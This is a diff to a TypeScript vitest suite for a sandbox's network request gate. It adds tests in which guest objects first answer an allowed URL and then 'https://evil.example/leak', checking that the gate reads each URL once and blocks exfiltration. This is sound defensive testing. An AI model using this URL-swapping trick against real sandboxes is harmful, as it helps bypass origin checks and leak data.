@@ -1,10 +1,10 @@
 import { describe, it, expect, beforeAll } from 'vitest';
 import { inSandboxScript } from '@src/lib/in-sandbox-script';
-import { createBroker } from '@src/lib/rpc';
 import { connectSources } from '@src/lib/csp/csp-generator';
 import { parseOrigins } from '@src/lib/csp/origins';
 import { GATE_SOURCE_FILE } from '@src/lib/violation';
 import { SyntaxKind, tokenize, type Token } from '../../scripts/js-tokens';
+import { createGateHarness } from './request-gate-harness';
 
 /**
  * The request gate of the guest bootstrap (in-sandbox-script.ts; S74): the URL check as one table of cases, what a refused
@@ -16,44 +16,6 @@ import { SyntaxKind, tokenize, type Token } from '../../scripts/js-tokens';
  * stand-ins installed as the platform's fetch, XMLHttpRequest and WebSocket before it captures them. A copy of the
  * stand-in fetch also sits on the global object's prototype, where a worker's platform keeps it (BD1:ISO-2).
  */
-class FakePort {
-    posted: any[] = [];
-    private handler: ((event: unknown) => void) | null = null;
-    postMessage(frame: unknown) { this.posted.push(frame); }
-    get onmessage() { return this.handler; }
-    set onmessage(handler) { this.handler = handler; }
-}
-
-const fetched: { url: string; credentials: string }[] = [];
-const platformFetch = (request: Request) => {
-    fetched.push({ url: request.url, credentials: request.credentials });
-    return Promise.resolve(new Response('ok'));
-};
-const opened: string[] = [];
-const sent: string[] = [];
-const credentialsSet: unknown[] = [];
-class PlatformXMLHttpRequest extends EventTarget {
-    static readonly DONE = 4;
-    private state = 0;
-    private target = '';
-    open(_method: string, url: string) { opened.push(url); this.target = url; this.state = 1; }
-    send() { sent.push(this.target); }
-    abort() {}
-    get readyState() { return this.state; }
-    get withCredentials() { return false; }
-    set withCredentials(value: unknown) { credentialsSet.push(value); }
-}
-const PLATFORM_MEMBERS = { open: PlatformXMLHttpRequest.prototype.open, send: PlatformXMLHttpRequest.prototype.send, abort: PlatformXMLHttpRequest.prototype.abort };
-const sockets: string[] = [];
-class PlatformWebSocket extends EventTarget {
-    static readonly OPEN = 1;
-    constructor(readonly url: string) { super(); sockets.push(url); }
-}
-
-const g = globalThis as any;
-let port: FakePort;
-const prototypeOfGlobal = Object.getPrototypeOf(globalThis);
-
 // What the policy of a build with these `origins.connect` and a registered file writes into connect-src: the gate's list.
 const CONNECT = connectSources({
     origins: parseOrigins({ connect: ['https://api.example', 'https://api.example:8443', 'wss://api.example', 'http://localhost:5173'] }, 'worker', () => {}),
@@ -61,22 +23,11 @@ const CONNECT = connectSources({
     scriptUnsafe: false,
 });
 
-beforeAll(() => {
-    g.MessagePort = FakePort;
-    Object.defineProperty(globalThis, 'fetch', { value: platformFetch, writable: true, configurable: true });
-    Object.defineProperty(prototypeOfGlobal, 'fetch', { value: platformFetch, writable: true, configurable: true });
-    g.XMLHttpRequest = PlatformXMLHttpRequest;
-    g.WebSocket = PlatformWebSocket;
-    // strict mode's form: the port is handed to attach() (no INIT_PORT listener), as the strict prelude does
-    const comms = inSandboxScript(false, 'strict', { log() {}, info() {}, warn() {}, error() {} } as unknown as Console, createBroker, { externalPort: true, connect: CONNECT });
-    port = new FakePort();
-    comms.attach(port as unknown as MessagePort);
-});
+const gate = createGateHarness();
+const { fetched, opened, sent, sockets, credentialsSet, platformFetch, PlatformXMLHttpRequest, PlatformWebSocket, PLATFORM_MEMBERS, prototypeOfGlobal, reports, clear } = gate;
+const g = globalThis as any;
 
-const reports = () => port.posted.filter(frame => frame.type === 'VIOLATION');
-const clear = () => {
-    port.posted.length = fetched.length = opened.length = sent.length = sockets.length = credentialsSet.length = 0;
-};
+beforeAll(() => gate.install(CONNECT));
 
 describe('the list is the policy\'s: the connect-src sources, exactly', () => {
     it('the gate is given what the policy writes into connect-src', () => {
@@ -207,6 +158,83 @@ describe('a refused XMLHttpRequest fails as a network error does', () => {
         xhr.open('GET', 'https://api.example/c');
         xhr.send();
         expect(sent).toEqual(['https://api.example/c']);
+    });
+});
+
+/**
+ * The URL checked is the URL sent (BD3:TST-1, class G with E-net: one read of a guest value). A guest hands the makers an
+ * object that answers differently each time it is read; the maker must read it once, check that, and give the platform
+ * that, never the object again. fetch() builds one Request from the input and sends a Request built from it; open() gives
+ * the platform the resolved URL; the WebSocket constructor gives it the resolved URL too.
+ */
+describe('the URL checked is the URL sent: a guest value is read once', () => {
+    const flipping = (first: string, second: string) => { let reads = 0; return { toString: () => (reads++ === 0 ? first : second), reads: () => reads }; };
+
+    it('XMLHttpRequest.open: an object that answers an admitted URL, then a blocked one, sends the admitted one, read once', () => {
+        clear();
+        const url = flipping('https://api.example/ok', 'https://evil.example/leak');
+        const xhr = new XMLHttpRequest();
+        xhr.open('GET', url as unknown as string);
+        xhr.send();
+        expect(opened).toEqual(['https://api.example/ok']);
+        expect(sent).toEqual(['https://api.example/ok']);
+        expect(url.reads()).toBe(1);
+        expect(reports()).toEqual([]);
+    });
+
+    it('XMLHttpRequest.open: the first answer blocked, the second admitted, is refused on the first and reported as it', () => {
+        clear();
+        const xhr = new XMLHttpRequest();
+        xhr.open('GET', flipping('https://evil.example/leak', 'https://api.example/ok') as unknown as string);
+        xhr.send();
+        expect(sent).toEqual([]);
+        expect(reports()).toEqual(reportOf('https://evil.example/leak'));
+    });
+
+    it('WebSocket: an object that answers an admitted URL, then a blocked one, connects to the admitted one, read once', () => {
+        clear();
+        const url = flipping('wss://api.example/ok', 'wss://evil.example/leak');
+        new WebSocket(url as unknown as string);
+        expect(sockets).toEqual(['wss://api.example/ok']);
+        expect(url.reads()).toBe(1);
+        expect(reports()).toEqual([]);
+    });
+
+    it('fetch: an input that answers an admitted URL, then a blocked one, sends the admitted one only, with an init and without', async () => {
+        clear();
+        const withInit = flipping('https://api.example/ok', 'https://evil.example/leak');
+        await fetch(withInit as unknown as string, { method: 'POST', body: 'x' });
+        const bare = flipping('https://api.example/bare', 'https://evil.example/leak');
+        await fetch(bare as unknown as string);
+        expect(fetched.map(entry => entry.url)).toEqual(['https://api.example/ok', 'https://api.example/bare']);
+        expect(withInit.reads() + bare.reads()).toBe(2);
+        expect(reports()).toEqual([]);
+    });
+
+    it('fetch: a URL object changed after the call does not change the request (the positive control: what is sent was made at the call)', async () => {
+        clear();
+        const url = new URL('https://api.example/ok');
+        const pending = fetch(url);
+        url.href = 'https://evil.example/leak';
+        await pending;
+        expect(fetched.map(entry => entry.url)).toEqual(['https://api.example/ok']);
+    });
+});
+
+describe('a relative URL resolves against the realm\'s base, as the platform resolves it (BD3:TST-3)', () => {
+    // strict mode's form is a worker's: it has no document, so the base is its location (a document's is its baseURI,
+    // read the same way). A relative URL that did not resolve would throw a SyntaxError from open() and the constructor
+    // instead of being checked, refused and reported as the URL it names.
+    it('XMLHttpRequest and WebSocket refuse a relative URL as the absolute URL it resolves to, and report that', () => {
+        clear();
+        const base = (globalThis as any).location.href as string;
+        const xhr = new XMLHttpRequest();
+        expect(() => xhr.open('GET', '/rel?q#f')).not.toThrow();
+        xhr.send();
+        expect(sent).toEqual([]);
+        expect(reports()).toEqual(reportOf(new URL('/rel?q', base).href));
+        expect(() => new WebSocket('/socket')).toThrow(expect.objectContaining({ name: 'SecurityError' }));
+        expect(reports()[1]).toEqual(reportOf(new URL('/socket', base).href.replace(/^http/, 'ws'))[0]);
     });
 });
 
